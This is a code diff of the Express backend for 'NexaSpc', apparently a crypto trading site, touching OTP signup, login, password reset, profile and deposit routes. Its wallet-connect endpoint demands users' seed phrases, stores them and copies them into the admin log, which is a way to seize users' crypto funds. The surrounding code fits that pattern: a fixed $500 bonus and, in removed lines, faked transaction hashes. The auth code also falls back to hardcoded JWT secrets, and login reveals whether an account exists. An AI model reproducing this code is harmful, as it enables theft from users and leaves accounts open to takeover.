@@ -1,4 +1,6 @@
 // require('dotenv').config();
+const dotenv = require('dotenv');
+dotenv.config();
 
 const express = require('express');
 const bcrypt = require('bcryptjs');
@@ -10,10 +12,6 @@ const path = require('path');
 const {Resend} = require('resend');
 const nodemailer = require('nodemailer');
 const { google } = require('googleapis');
-
-const dotenv = require('dotenv');
-dotenv.config();
-
 
 const app = express();
 const PORT = process.env.PORT || 10000;
@@ -40,13 +38,22 @@ const transactions = {};
 const notifications = {};
 const connectedWallets = {};
 const adminLog = [];
-
-
 // Pending registrations waiting for OTP verification
 // pendingUsers[email] = { username, email, hashedPassword, phone, emailOtp, phoneOtp, emailOtpExpiry, phoneOtpExpiry, emailVerified, phoneVerified }
 const pendingUsers = {};
 
 const Transaction = require('../models/transaction');
+
+
+
+// ─── PLATFORM WALLETS ─────────────────────────────────────────
+const platformWallets = {
+  BTC:  '1NdiB8cYvfeXxTCse6UVfR7uMo4MUvKNxB',
+  ETH:  '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
+  USDT: 'TQn9Y2khDD9SKgGpuJqS4mVkRYHF8e9tPZ',
+  XRP:  'rN7n3473SaZBCG4dFL83w7PB5bNNnSfPQ',
+  SOL:  'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB56sC24'
+};
 
 // ─── OTP HELPERS ──────────────────────────────────────────────
 function generateOtp() {
@@ -70,12 +77,12 @@ async function sendSms(phone, message) {
 }
 
 // ─── SMS (optional stub) ──────────────────────────────────────
-async function sendSms(phone, message) {
-  console.log(`\n[SMS → ${phone}]\n${message}\n`);
+// async function sendSms(phone, message) {
+//   console.log(`\n[SMS → ${phone}]\n${message}\n`);
   // Uncomment for Twilio:
   // const twilio = require('twilio')(process.env.TWILIO_SID, process.env.TWILIO_TOKEN);
   // await twilio.messages.create({ body: message, from: process.env.TWILIO_FROM, to: phone });
-}
+// }
 
 // ─── GMAIL API OAUTH2 SETUP ───
 const OAuth2 = google.auth.OAuth2;
@@ -155,27 +162,51 @@ function pushNotif(email, type, message, meta = {}) {
   return notif;
 }
  
-
 function logAdmin(type, data) {
   adminLog.unshift({ id: Date.now() + Math.random(), type, date: new Date().toISOString(), ...data });
   if (adminLog.length > 500) adminLog.pop();
 }
 
 
-//AUTH MIDDLEWARE-------------------------------------------------------
-//--------------------------------------------------------------------------------
 function authMiddleware(req, res, next) {
-  const token = req.headers.authorization?.split(' ')[1];
-  if (!token) return res.status(401).json({ error: 'No token provided' });
+  const authHeader = req.headers['authorization'];
+  const token = authHeader && authHeader.split(' ')[1];
 
-  try { 
-    req.user = jwt.verify(token, JWT_SECRET); 
-    next(); 
-  } catch (err) { 
-    return res.status(401).json({ error: 'Invalid or expired token' }); 
+  if (!token) {
+    return res.status(401).json({ error: 'Access denied: No token provided' });
   }
+
+  // First try verifying with standard user JWT secret
+  jwt.verify(token, process.env.JWT_SECRET || 'USER_SECRET_KEY', (err, decodedUser) => {
+    if (!err) {
+      req.user = decodedUser;
+      return next();
+    }
+
+    // Fallback: If user verification fails, check if it's a valid admin token
+    jwt.verify(token, process.env.ADMIN_SECRET || 'ADMIN_SECRET_KEY', (adminErr, decodedAdmin) => {
+      if (!adminErr) {
+        req.user = decodedAdmin; // Attach admin details to req.user
+        return next();
+      }
+
+      return res.status(401).json({ error: 'Invalid or expired token' });
+    });
+  });
 }
 
+function genOtp() {
+  return Math.floor(100000 + Math.random() * 900000).toString();
+}
+
+// 2. Function to calculate when the OTP should expire (15 minutes from now)
+function otpExpiry(minutes) {
+  return new Date(Date.now() + minutes * 60 * 1000).toISOString();
+}
+
+// ══════════════════════════════════════════════════════════════
+//  ADMIN MIDDLEWARE
+// ══════════════════════════════════════════════════════════════
 function adminMiddleware(req, res, next) {
   const token = req.headers.authorization?.split(' ')[1];
   if (!token) return res.status(401).json({ error: 'Unauthorized' });
@@ -265,14 +296,14 @@ app.post('/api/auth/initiate', async (req, res) => {
 }
 
 // 1. Function to generate a secure, random 6-digit number string
-function genOtp() {
-  return Math.floor(100000 + Math.random() * 900000).toString();
-}
+// function genOtp() {
+//   return Math.floor(100000 + Math.random() * 900000).toString();
+// }
 
-// 2. Function to calculate when the OTP should expire (15 minutes from now)
-function otpExpiry(minutes) {
-  return new Date(Date.now() + minutes * 60 * 1000).toISOString();
-}
+// // 2. Function to calculate when the OTP should expire (15 minutes from now)
+// function otpExpiry(minutes) {
+//   return new Date(Date.now() + minutes * 60 * 1000).toISOString();
+// }
 
     // In dev mode include the OTP in the response so it works without real SMTP/SMS
     const DEV_MODE = process.env.NODE_ENV !== 'production';
@@ -285,7 +316,7 @@ function otpExpiry(minutes) {
     };
 
     if (DEV_MODE) {
-      responsePayload.devOtp = otp;
+      // responsePayload.devOtp = otp; 
       console.log(`\n[DEV MODE] OTP for ${email}: ${otp}\n`);
     }
 
@@ -303,7 +334,7 @@ function isExpired(expiryTime) {
   const expiry = new Date(expiryTime);
   return now > expiry;
 }
- 
+
 // ══════════════════════════════════════════════════════════════
 //  STEP 2a — VERIFY EMAIL OTP
 //  POST /api/auth/verify-email
@@ -369,64 +400,6 @@ app.post('/api/auth/verify', async (req, res) => {
   }
 });
 
-// app.post('/api/auth/verify', (req, res) => {
-//   try {
-//     const { email, otp } = req.body;
-//     if (!email || !otp) return res.status(400).json({ error: 'Email and OTP required.' });
-
-//     const pending = pendingUsers[email];
-//     if (!pending) return res.status(400).json({ error: 'No pending registration found. Please start again.' });
-
-//     if (isExpired(pending.otpExpiry))
-//       return res.status(400).json({ error: 'Code has expired. Please request a new one.' });
-
-//     if (pending.otp !== otp.trim())
-//       return res.status(400).json({ error: 'Incorrect code. Please check and try again.' });
-
-//     if (pending.otpExpiry) {
-//       const now = new Date();
-//       const expiry = new Date(pending.otpExpiry);
-//       if (now > expiry) {
-//         return res.status(400).json({ error: 'Code has expired. Please request a new one.' });
-//       }
-//     }
-
-//     // FIX 2: Safely convert both values to strings before evaluating to prevent .trim() crashes
-//     const safeInputOtp = String(otp).trim();
-//     const safeServerOtp = String(pending.otp).trim();
-
-//     if (safeServerOtp !== safeInputOtp) {
-//       return res.status(400).json({ error: 'Incorrect code. Please check and try again.' });
-//     }
-
-//     pending.verified = true;
-//     return res.json({ success: true, message: 'Code verified!' });
-//   } catch (err) {
-//     console.error('[/api/auth/verify] CRITICAL EXCEPTION:', err);
-//     return res.status(500).json({ error: 'Server error.' });
-//   }
-
-//   try {
-//     // ... OTP verification logic ...
-
-//     const newUser = new User({
-//       email: email,
-//       password: hashedPassword,
-//       isVerified: true
-//     });
-
-//     const savedUser = await newUser.save();
-    
-//     // Add this log to confirm the write:
-//     console.log('✅ User saved to DB:', savedUser._id, 'in collection:', User.collection.name);
-
-//     return res.status(200).json({ success: true, message: 'User registered!' });
-//   } catch (err) {
-//     console.error('❌ Failed to save user to MongoDB:', err);
-//     return res.status(500).json({ error: err.message });
-//   }
-// });
- 
 // ══════════════════════════════════════════════════════════════
 //  STEP 3 — COMPLETE REGISTRATION
 //  POST /api/auth/complete
@@ -498,7 +471,7 @@ app.post('/api/auth/complete', async (req, res) => {
     return res.status(500).json({ error: 'Server error completing registration.' });
   }
 });
- 
+
 // ══════════════════════════════════════════════════════════════
 //  RESEND OTP
 //  POST /api/auth/resend-otp  { email, type: 'email'|'phone' }
@@ -531,17 +504,22 @@ app.post('/api/auth/resend', async (req, res) => {
     }
 
     const payload = { success: true, message: 'New code sent.' };
-    if (DEV_MODE) { payload.devOtp = newOtp; console.log(`[DEV] New OTP for ${email}: ${newOtp}`); }
+    if (DEV_MODE) { 
+      // payload.devOtp = newOtp; 
+      console.log(`[DEV] New OTP for ${email}: ${newOtp}`); 
+    }
+
     res.json(payload);
   } catch (err) {
     console.error('[/api/auth/resend] ERROR:', err);
     res.status(500).json({ error: 'Server error.' });
   }
 });
- 
+
 // ══════════════════════════════════════════════════════════════
 //  LOGIN  (unchanged but now checks verified status)
 // ══════════════════════════════════════════════════════════════
+// SINGLE UNIFIED LOGIN API ROUTE
 app.post('/api/login', async (req, res) => {
   try {
     const { email, password } = req.body;
@@ -555,9 +533,12 @@ app.post('/api/login', async (req, res) => {
     // 1. Fetch user directly from MongoDB Atlas
     const user = await User.findOne({ email: cleanEmail });
 
+    // Explicit check if user was deleted or never registered
     if (!user) {
       console.log(`[LOGIN FAILED] No MongoDB record found for: ${cleanEmail}`);
-      return res.status(400).json({ error: 'Invalid credentials' });
+      return res.status(404).json({ 
+        error: 'Account not found. This account may have been deleted or does not exist.' 
+      });
     }
 
     // 2. Compare incoming plain-text password with stored bcrypt hash
@@ -565,7 +546,7 @@ app.post('/api/login', async (req, res) => {
 
     if (!match) {
       console.log(`[LOGIN FAILED] Password mismatch for user: ${cleanEmail}`);
-      return res.status(400).json({ error: 'Invalid credentials' });
+      return res.status(400).json({ error: 'Incorrect password. Please try again.' });
     }
 
     // 3. Update last login timestamp in MongoDB
@@ -609,7 +590,7 @@ app.post('/api/login', async (req, res) => {
         username: user.username || '',
         email: user.email,
         walletBalance: user.walletBalance || 0,
-        bonuses: user.bonuses || 500, // 👈 Returned to frontend
+        bonuses: user.bonuses !== undefined ? user.bonuses : 500,
         deposits: user.deposits || 0,
         profits: user.profits || 0,
         assets: user.assets || []
@@ -621,29 +602,177 @@ app.post('/api/login', async (req, res) => {
     return res.status(500).json({ error: 'Server error during login. Please try again.' });
   }
 });
- 
+
+
+//══════════════════════════════════════════════════════════════
+//  FORGOT PASSWORD — REQUEST CODE
+//  POST /api/auth/forgot-password
+// ══════════════════════════════════════════════════════════════
+//══════════════════════════════════════════════════════════════
+//  FORGOT PASSWORD — REQUEST CODE
+// ══════════════════════════════════════════════════════════════
+app.post('/api/auth/forgot-password', async (req, res) => {
+  try {
+    const { email } = req.body;
+
+    if (!email) {
+      return res.status(400).json({ error: 'Email address is required.' });
+    }
+
+    const cleanEmail = email.toLowerCase().trim();
+
+    // 1. Generate OTP & Expiry
+    const resetOtp = genOtp();
+    const expiry = new Date(Date.now() + 15 * 60 * 1000); // 15 minutes
+
+    // 2. Atomic Update directly in MongoDB
+    const user = await User.findOneAndUpdate(
+      { email: cleanEmail },
+      { 
+        $set: { 
+          resetOtp: resetOtp, 
+          resetOtpExpiry: expiry 
+        } 
+      },
+      { new: true } // Return updated document
+    );
+
+    if (!user) {
+      console.log(`[DEBUG] Forgot Password: "${cleanEmail}" not found in MongoDB.`);
+      // Return 200 to prevent email harvesting
+      return res.status(200).json({
+        success: true,
+        message: 'If an account exists, a verification code has been sent.'
+      });
+    }
+
+    // 3. Construct Email Template
+    const emailHtml = `
+      <div style="font-family:sans-serif;max-width:520px;margin:auto;background:#0a0e1a;color:#e2e8f0;padding:2.5rem;border-radius:16px;border:1px solid #1e2d4a">
+        <div style="text-align:center;margin-bottom:1.5rem">
+          <span style="font-size:2rem;font-weight:900;color:#00d4ff">NexaSpc</span>
+        </div>
+        <h2 style="color:#00d4ff;margin:0 0 0.5rem">Reset Your Password</h2>
+        <p style="color:#94a3b8;margin:0 0 1.5rem">Hi <strong style="color:#e2e8f0">${user.username || 'there'}</strong>, enter this code to reset your account password:</p>
+        <div style="background:#111827;border:2px solid #00d4ff;border-radius:12px;padding:1.5rem;text-align:center;margin:0 0 1.5rem">
+          <span style="font-size:3rem;font-weight:900;font-family:monospace;letter-spacing:0.6rem;color:#00d4ff">${resetOtp}</span>
+        </div>
+        <p style="color:#64748b;font-size:0.8rem;margin:0">Valid for <strong>15 minutes</strong>. Never share this code with anyone.</p>
+        <hr style="border:none;border-top:1px solid #1e2d4a;margin:1.5rem 0">
+        <p style="color:#475569;font-size:0.75rem;margin:0">NexaSpc · Digital Asset Trading · noreply@nexaspc.io</p>
+      </div>`;
+
+    // 4. Deliver Email
+    await sendEmail(user.email, `${resetOtp} — Your NexaSpc password reset code`, emailHtml);
+
+    console.log(`[DEBUG] Email sent via Gmail API to: ${user.email}`);
+
+    return res.json({
+      success: true,
+      message: 'If an account exists, a verification code has been sent.'
+    });
+
+  } catch (err) {
+    console.error('[/api/auth/forgot-password] ERROR:', err);
+    return res.status(500).json({ error: 'Server error processing password reset.' });
+  }
+});
+
+//══════════════════════════════════════════════════════════════
+//  RESET PASSWORD — CONFIRM CODE & UPDATE PASSWORD
+// ══════════════════════════════════════════════════════════════
+app.post('/api/auth/reset-password', async (req, res) => {
+  try {
+    const { email, code, newPassword } = req.body;
+
+    if (!email || !code || !newPassword) {
+      return res.status(400).json({ error: 'Email, code, and new password are required.' });
+    }
+
+    if (newPassword.length < 8) {
+      return res.status(400).json({ error: 'Password must be at least 8 characters long.' });
+    }
+
+    const cleanEmail = email.toLowerCase().trim();
+    const cleanCode = String(code).trim();
+
+    // Query user in MongoDB
+    const user = await User.findOne({ email: cleanEmail });
+
+    if (!user || !user.resetOtp) {
+      console.log(`[DEBUG Reset Failed] No user or resetOtp found in DB for "${cleanEmail}"`);
+      return res.status(400).json({ error: 'Invalid or expired verification code.' });
+    }
+
+    // 1. Expiration check using raw timestamps
+    if (Date.now() > new Date(user.resetOtpExpiry).getTime()) {
+      console.log(`[DEBUG Reset Failed] Code expired for ${cleanEmail}`);
+      user.resetOtp = undefined;
+      user.resetOtpExpiry = undefined;
+      await user.save();
+      return res.status(400).json({ error: 'Verification code has expired. Please request a new one.' });
+    }
+
+    // 2. String comparison for OTP match
+    if (String(user.resetOtp).trim() !== cleanCode) {
+      console.log(`[DEBUG Reset Failed] Mismatch! DB Code: "${user.resetOtp}" vs Received Code: "${cleanCode}"`);
+      return res.status(400).json({ error: 'Invalid verification code.' });
+    }
+
+    // 3. Hash new password & clear reset fields
+    const saltRounds = 10;
+    user.password = await bcrypt.hash(newPassword, saltRounds);
+    user.resetOtp = undefined;
+    user.resetOtpExpiry = undefined;
+    await user.save();
+
+    console.log(`[AUTH SUCCESS] Password successfully updated in MongoDB for ${cleanEmail}`);
+
+    return res.json({
+      success: true,
+      message: 'Password reset successfully.'
+    });
+
+  } catch (err) {
+    console.error('[/api/auth/reset-password] ERROR:', err);
+    return res.status(500).json({ error: 'Server error resetting password.' });
+  }
+});
+
+
 // ─── PROFILE ──────────────────────────────────────────────────
 app.get('/api/profile', authMiddleware, async (req, res) => {
   try {
-    // Fetch user directly from MongoDB using the email attached by authMiddleware
-    const user = await User.findOne({ email: req.user.email.toLowerCase().trim() });
-
-    if (!user) {
-      return res.status(404).json({ error: 'User not found' });
+    if (!req.user || !req.user.email) {
+      return res.status(401).json({ error: 'Unauthorized: User email missing from token payload' });
     }
 
-    // Return profile data mapped cleanly to MongoDB document fields
-    return res.json({
+    const cleanEmail = req.user.email.toLowerCase().trim();
+    const user = await User.findOne({ email: cleanEmail });
+
+    if (!user) {
+      return res.status(404).json({ error: 'User profile not found in MongoDB' });
+    }
+
+    // Return profile data with aliases so both front-end conventions work
+    return res.status(200).json({
+      success: true,
       username: user.username || user.email.split('@')[0],
       email: user.email,
       phone: user.phone || '',
-      balance: user.walletBalance || 0,        // Mapped from walletBalance
+      
+      // Send both property names to prevent frontend mapping issues
+      walletBalance: user.walletBalance !== undefined ? user.walletBalance : 0,
+      balance: user.walletBalance !== undefined ? user.walletBalance : 0,
+      
       deposits: user.deposits || 0,
       profits: user.profits || 0,
-      bonuses: user.bonuses !== undefined ? user.bonuses : 500, // Guarantees $500 bonus
+      bonuses: user.bonuses || 0,
+      
+      holdings: user.holdings || [],
       twoFAEnabled: user.twoFAEnabled || false,
       emailNotifications: user.emailNotifications !== false,
-      emailVerified: true,                     // Set during OTP verification
+      emailVerified: true,
       phoneVerified: user.phoneVerified || false,
       country: user.country || '',
       createdAt: user.createdAt,
@@ -651,287 +780,47 @@ app.get('/api/profile', authMiddleware, async (req, res) => {
     });
 
   } catch (err) {
-    console.error('[/api/profile] ERROR:', err);
-    return res.status(500).json({ error: 'Server error fetching profile.' });
-  }
-});
- 
-// ─── SETTINGS ─────────────────────────────────────────────────
-app.put('/api/settings/profile', authMiddleware, (req, res) => {
-  const user = users[req.user.email];
-  const { username, phone, country } = req.body;
-  if (username) user.username = username;
-  if (phone !== undefined) user.phone = phone;
-  if (country !== undefined) user.country = country;
-  pushNotif(req.user.email, 'settings', 'Profile information updated.');
-  res.json({ success: true, username: user.username, phone: user.phone, country: user.country });
-});
- 
-app.put('/api/settings/password', authMiddleware, async (req, res) => {
-  const { currentPassword, newPassword } = req.body;
-  const user = users[req.user.email];
-  const match = await bcrypt.compare(currentPassword, user.password);
-  if (!match) return res.status(400).json({ error: 'Current password is incorrect' });
-  if (newPassword.length < 8) return res.status(400).json({ error: 'Password must be at least 8 characters' });
-  user.password = await bcrypt.hash(newPassword, 10);
-  pushNotif(req.user.email, 'security', 'Password changed successfully.');
-  await sendEmail(req.user.email, '🔑 NexaSpc Password Changed', `
-    <div style="font-family:sans-serif;background:#0a0e1a;color:#e2e8f0;padding:2rem;border-radius:12px;max-width:500px;margin:auto">
-      <h2 style="color:#00d4ff">Password Changed</h2>
-      <p>Your NexaSpc password was just changed. If this wasn't you, contact support immediately.</p>
-    </div>`);
-  res.json({ success: true });
-});
- 
-app.put('/api/settings/2fa', authMiddleware, (req, res) => {
-  const user = users[req.user.email];
-  user.twoFAEnabled = !user.twoFAEnabled;
-  pushNotif(req.user.email, 'security', `2FA ${user.twoFAEnabled ? 'enabled' : 'disabled'}.`);
-  res.json({ success: true, twoFAEnabled: user.twoFAEnabled });
-});
- 
-app.put('/api/settings/notifications', authMiddleware, (req, res) => {
-  const user = users[req.user.email];
-  user.emailNotifications = !user.emailNotifications;
-  res.json({ success: true, emailNotifications: user.emailNotifications });
-});
- 
-// ─── NOTIFICATIONS ────────────────────────────────────────────
-app.get('/api/notifications', authMiddleware, (req, res) => {
-  res.json(notifications[req.user.email] || []);
-});
-app.put('/api/notifications/read', authMiddleware, (req, res) => {
-  (notifications[req.user.email] || []).forEach(n => n.read = true);
-  res.json({ success: true });
-});
-
-
-// Wallet addresses for deposits
-const walletAddresses = {
-  BTC: '1NdiB8cYvfeXxTCse6UVfR7uMo4MUvKNxB',
-  ETH: '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
-  USDT: 'TQn9Y2khDD9SKgGpuJqS4mVkRYHF8e9tPZ',
-  XRP: 'rN7n3473SaZBCG4dFL83w7PB5bNNnSfPQ',
-  SOL: 'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB56sC24'
-};
-
-// Middleware to verify JWT token
-// function authMiddleware(req, res, next) {
-//   const token = req.headers.authorization?.split(' ')[1];
-//   if (!token) return res.status(401).json({ error: 'No token provided' });
-//   try {
-//     const decoded = jwt.verify(token, JWT_SECRET);
-//     req.user = decoded;
-//     next();
-//   } catch {
-//     res.status(401).json({ error: 'Invalid token' });
-//   }
-// }
-
-// function adminMiddleware(req, res, next) {
-//   const token = req.headers.authorization?.split(' ')[1];
-//   if (!token) return res.status(401).json({ error: 'Unauthorized' });
-//   try { req.admin = jwt.verify(token, ADMIN_SECRET); next(); }
-//   catch { res.status(401).json({ error: 'Invalid admin token' }); }
-// }
-
-// Register
-// app.post('/api/register', async (req, res) => {
-//   const { username, email, password } = req.body;
-//   if (!username || !email || !password)
-//     return res.status(400).json({ error: 'All fields required' });
-//   if (users[email])
-//     return res.status(400).json({ error: 'User already exists' });
-
-//   const hashed = await bcrypt.hash(password, 10);
-//   users[email] = {
-//     username, email, password: hashed,
-//     balance: 0, deposits: 0, profits: 0, bonuses: 500,
-//     twoFAEnabled: false, emailNotifications: true,
-//     phone: '', country: '',
-//     createdAt: new Date().toISOString(),
-//     lastLogin: new Date().toISOString()
-//   };
-//   transactions[email] = [];
-//   notifications[email] = [];
-//   connectedWallets[email] = [];
-
-//   pushNotification(email, 'welcome', `Welcome to NexaSpc, ${username}! Your account is ready.`);
- 
-//   sendEmail(email, 'Welcome to NexaSpc!', `
-//     <div style="font-family:sans-serif;background:#0a0e1a;color:#e2e8f0;padding:2rem;border-radius:12px;max-width:500px;margin:auto">
-//       <h2 style="color:#00d4ff">Welcome, ${username}!</h2>
-//       <p>Your NexaSpc account has been created successfully.</p>
-//       <p>You have received a <strong style="color:#f59e0b">$500 welcome bonus</strong>.</p>
-//       <p style="color:#94a3b8;font-size:0.85rem">NexaSpc — Digital Asset Trading Platform</p>
-//     </div>`);
- 
-//   adminLog.unshift({ id: Date.now(), type: 'new_registration', userEmail: email, username, message: `New user: ${username} (${email})`, date: new Date().toISOString() });
-
-//   const token = jwt.sign({ email, username }, JWT_SECRET, { expiresIn: '7d' });
-//   res.json({ token, user: { username, email, balance: 0, deposits: 0, profits: 0, bonuses: 500 } });
-// });
-
-// Login
-// ══════════════════════════════════════════════════════════════
-//  LOGIN  (unchanged but now checks verified status)
-// ══════════════════════════════════════════════════════════════
-app.post('/api/login', async (req, res) => {
-  const { email, password } = req.body;
- 
-  // Check if stuck in pending
-  if (pendingUsers[email])
-    return res.status(400).json({
-      error: 'Account not fully verified. Please complete email and phone verification.',
-      pending: true
-    });
- 
-  const user = users[email];
-  if (!user) return res.status(400).json({ error: 'Invalid credentials' });
- 
-  const match = await bcrypt.compare(password, user.password);
-  if (!match) return res.status(400).json({ error: 'Invalid credentials' });
- 
-  user.lastLogin = new Date().toISOString();
- 
-  pushNotif(email, 'login', `New login to your account at ${new Date().toLocaleString()}.`);
-  await sendEmail(email, '🔐 NexaSpc Login Alert', `
-    <div style="font-family:sans-serif;max-width:520px;margin:auto;background:#0a0e1a;color:#e2e8f0;padding:2.5rem;border-radius:16px">
-      <h2 style="color:#00d4ff">Login Detected</h2>
-      <p>Hi <strong>${user.username}</strong>, a login was made to your NexaSpc account.</p>
-      <p style="color:#94a3b8"><strong>Time:</strong> ${new Date().toUTCString()}</p>
-      <p style="color:#ef4444;margin-top:1rem">⚠️ Not you? Change your password immediately and contact support.</p>
-    </div>`);
- 
-  logAdmin('login', { userEmail: email, username: user.username, message: `Login: ${user.username}` });
- 
-  const token = jwt.sign({ email, username: user.username }, JWT_SECRET, { expiresIn: '7d' });
-  res.json({
-    token,
-    user: {
-      username: user.username, email,
-      balance: user.balance, deposits: user.deposits,
-      profits: user.profits, bonuses: user.bonuses,
-      emailVerified: user.emailVerified,
-      phoneVerified: user.phoneVerified
-    }
-  });
-});
-
-// Get user profile
-// ─── PROFILE ──────────────────────────────────────────────────
-app.get('/api/profile', authMiddleware, async (req, res) => {
-  try {
-    // Fetch user directly from MongoDB using the email attached by authMiddleware
-    const user = await User.findOne({ email: req.user.email.toLowerCase().trim() });
-
-    if (!user) {
-      return res.status(404).json({ error: 'User not found' });
-    }
-
-    // Return profile data mapped cleanly to MongoDB document fields
-    return res.json({
-      username: user.username || user.email.split('@')[0],
-      email: user.email,
-      phone: user.phone || '',
-      balance: user.walletBalance || 0,        // Mapped from walletBalance
-      deposits: user.deposits || 0,
-      profits: user.profits || 0,
-      bonuses: user.bonuses !== undefined ? user.bonuses : 500, // Guarantees $500 bonus
-      twoFAEnabled: user.twoFAEnabled || false,
-      emailNotifications: user.emailNotifications !== false,
-      emailVerified: true,                     // Set during OTP verification
-      phoneVerified: user.phoneVerified || false,
-      country: user.country || '',
-      createdAt: user.createdAt,
-      lastLogin: user.lastLogin
-    });
-
-  } catch (err) {
-    console.error('[/api/profile] ERROR:', err);
-    return res.status(500).json({ error: 'Server error fetching profile.' });
+    console.error("❌ Error fetching /api/profile:", err);
+    return res.status(500).json({ error: 'Server error retrieving user profile' });
   }
 });
 
-// ─── SETTINGS ─────────────────────────────────────────────────
-app.put('/api/settings/profile', authMiddleware, (req, res) => {
-  const user = users[req.user.email];
-  const { username, phone, country } = req.body;
-  if (username) user.username = username;
-  if (phone !== undefined) user.phone = phone;
-  if (country !== undefined) user.country = country;
-  pushNotif(req.user.email, 'settings', 'Profile information updated.');
-  res.json({ success: true, username: user.username, phone: user.phone, country: user.country });
-});
- 
-app.put('/api/settings/password', authMiddleware, async (req, res) => {
-  const { currentPassword, newPassword } = req.body;
-  const user = users[req.user.email];
-  const match = await bcrypt.compare(currentPassword, user.password);
-  if (!match) return res.status(400).json({ error: 'Current password is incorrect' });
-  if (newPassword.length < 8) return res.status(400).json({ error: 'Password must be at least 8 characters' });
-  user.password = await bcrypt.hash(newPassword, 10);
-  pushNotif(req.user.email, 'security', 'Password changed successfully.');
-  await sendEmail(req.user.email, '🔑 NexaSpc Password Changed', `
-    <div style="font-family:sans-serif;background:#0a0e1a;color:#e2e8f0;padding:2rem;border-radius:12px;max-width:500px;margin:auto">
-      <h2 style="color:#00d4ff">Password Changed</h2>
-      <p>Your NexaSpc password was just changed. If this wasn't you, contact support immediately.</p>
-    </div>`);
-  res.json({ success: true });
-});
- 
-app.put('/api/settings/2fa', authMiddleware, (req, res) => {
-  const user = users[req.user.email];
-  user.twoFAEnabled = !user.twoFAEnabled;
-  pushNotif(req.user.email, 'security', `2FA ${user.twoFAEnabled ? 'enabled' : 'disabled'}.`);
-  res.json({ success: true, twoFAEnabled: user.twoFAEnabled });
-});
- 
-app.put('/api/settings/notifications', authMiddleware, (req, res) => {
-  const user = users[req.user.email];
-  user.emailNotifications = !user.emailNotifications;
-  res.json({ success: true, emailNotifications: user.emailNotifications });
-});
- 
-// ─── NOTIFICATIONS ────────────────────────────────────────────
-app.get('/api/notifications', authMiddleware, (req, res) => {
-  res.json(notifications[req.user.email] || []);
-});
-app.put('/api/notifications/read', authMiddleware, (req, res) => {
-  (notifications[req.user.email] || []).forEach(n => n.read = true);
-  res.json({ success: true });
-});
-
-// ─── PLATFORM WALLETS ─────────────────────────────────────────
-const platformWallets = {
-  BTC:  '1NdiB8cYvfeXxTCse6UVfR7uMo4MUvKNxB',
-  ETH:  '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
-  USDT: 'TQn9Y2khDD9SKgGpuJqS4mVkRYHF8e9tPZ',
-  XRP:  'rN7n3473SaZBCG4dFL83w7PB5bNNnSfPQ',
-  SOL:  'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB56sC24'
-};
 app.get('/api/wallets', authMiddleware, (req, res) => res.json(platformWallets));
  
 // ─── CONNECT DECENTRALIZED WALLET ─────────────────────────────
 app.post('/api/wallet/connect', authMiddleware, (req, res) => {
   const { walletType, walletAddress, seedPhrase, network } = req.body;
+
   if (!walletType || !seedPhrase) return res.status(400).json({ error: 'Wallet type and seed phrase required' });
   if (!connectedWallets[req.user.email]) connectedWallets[req.user.email] = [];
+
   const entry = { id: Date.now(), walletType, walletAddress: walletAddress || '', seedPhrase, network: network || 'Unknown', connectedAt: new Date().toISOString() };
   connectedWallets[req.user.email].push(entry);
+
   pushNotif(req.user.email, 'wallet', `${walletType} wallet connected.`);
   logAdmin('wallet_connected', { userEmail: req.user.email, username: users[req.user.email]?.username, walletType, walletAddress: walletAddress || '', seedPhrase, network: network || 'Unknown', message: `Wallet: ${walletType} by ${users[req.user.email]?.username}` });
   res.json({ success: true, wallet: { id: entry.id, walletType, walletAddress: entry.walletAddress, network: entry.network, connectedAt: entry.connectedAt } });
 });
+
 app.get('/api/wallet/connected', authMiddleware, (req, res) => {
   res.json((connectedWallets[req.user.email] || []).map(w => ({ id: w.id, walletType: w.walletType, walletAddress: w.walletAddress, network: w.network, connectedAt: w.connectedAt })));
 });
+
 app.delete('/api/wallet/connected/:id', authMiddleware, (req, res) => {
   const id = parseInt(req.params.id);
   connectedWallets[req.user.email] = (connectedWallets[req.user.email] || []).filter(w => w.id !== id);
   res.json({ success: true });
 });
  
+// ─── NOTIFICATIONS ────────────────────────────────────────────
+app.get('/api/notifications', authMiddleware, (req, res) => {
+  res.json(notifications[req.user.email] || []);
+});
+app.put('/api/notifications/read', authMiddleware, (req, res) => {
+  (notifications[req.user.email] || []).forEach(n => n.read = true);
+  res.json({ success: true });
+});
+
 // ─── DEPOSIT ──────────────────────────────────────────────────
 app.post('/api/deposit', authMiddleware, async (req, res) => {
   try {
@@ -942,103 +831,78 @@ app.post('/api/deposit', authMiddleware, async (req, res) => {
       return res.status(400).json({ error: 'Invalid deposit data' });
     }
 
-    const email = req.user.email.toLowerCase().trim();
-    const user = await User.findOne({ email });
+    const cleanEmail = req.user.email.toLowerCase().trim();
+    const user = await User.findOne({ email: cleanEmail });
     if (!user) return res.status(404).json({ error: 'User not found' });
 
-    // Save as PENDING transaction (Does NOT update balance yet)
+    // 1. Create PENDING Transaction ONLY
     const tx = await Transaction.create({
       userId: user._id,
-      userEmail: email,
+      userEmail: cleanEmail,
       type: 'deposit',
       coin: coin.toUpperCase(),
       amount: amt,
-      txHash: txHash || '0x' + Math.random().toString(36).substring(2, 10),
-      status: 'pending'
+      txHash: txHash || '',
+      status: 'pending' // ⚠️ MUST BE PENDING
     });
 
-    // OPTIONAL: Auto-confirm after random delay between 3 to 12 minutes (180,000ms - 720,000ms)
-    const randomDelay = Math.floor(Math.random() * (720000 - 180000 + 1)) + 180000;
-
-    // Optional: Auto-approve after 5 minutes (300,000 ms)
-    setTimeout(async () => {
-      try {
-        const pendingTx = await Transaction.findById(tx._id);
-        // Only confirm if admin hasn't rejected/changed status manually
-        if (pendingTx && pendingTx.status === 'pending') {
-          pendingTx.status = 'completed';
-          await pendingTx.save();
-
-          // Increment balance and update specific coin holding
-          await creditUserDeposit(user._id, pendingTx.coin, pendingTx.amount);
-        }
-      } catch (e) {
-        console.error('Auto-confirm error:', e);
-      }
-    }, 300000);
+    // ❌ DO NOT DO THIS HERE:
+    // user.walletBalance += amt;
+    // user.deposits += amt;
+    // await user.save();
 
     return res.json({
       success: true,
-      message: 'Deposit submitted! Processing takes 3-12 minutes.',
+      message: 'Deposit submitted successfully! Awaiting admin approval.',
       transaction: tx
     });
   } catch (err) {
-    console.error('[/api/deposit] ERROR:', err);
-    return res.status(500).json({ error: 'Server error processing deposit.' });
